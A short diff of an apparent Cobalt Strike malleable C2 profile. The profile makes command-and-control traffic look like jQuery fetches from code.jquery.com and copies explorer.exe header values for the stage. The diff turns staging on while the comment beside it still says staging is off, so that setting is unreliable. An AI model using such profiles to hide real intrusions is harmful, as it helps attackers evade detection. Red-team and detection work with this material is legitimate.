@@ -44,7 +44,7 @@ set dns_sleep       "0"; #    Force a sleep prior to each individual DNS request
 set dns_stager_prepend ".resources.123456.";
 set dns_stager_subhost ".feeds.123456.";
 
-set host_stage "false"; # Do not use staging. Must use stagles payloads
+set host_stage "true"; # Do not use staging. Must use stagles payloads
 
 http-stager {  
     set uri_x86 "/jquery-3.3.1.slim.min.js";
@@ -68,7 +68,8 @@ http-stager {
     }
 
     client {
-        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        #header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        header "Accept" "text/html,application/xml;q=0.9,*/*;q=0.8";
         header "Accept-Language" "en-US,en;q=0.5";
         header "Host" "code.jquery.com";
         header "Referer" "http://code.jquery.com/";
@@ -85,7 +86,7 @@ stage {
 
     # Values captured using peclone agaist a Windows 10 version of explorer.exe
     set checksum       "0";
-    set compile_time   "17 二月 2004 13:43:20";
+    set compile_time   "17 Feb 2004 13:43:20";
     set entry_point    "688496";
     set image_size_x86 "3919872";
     set image_size_x64 "3919872";
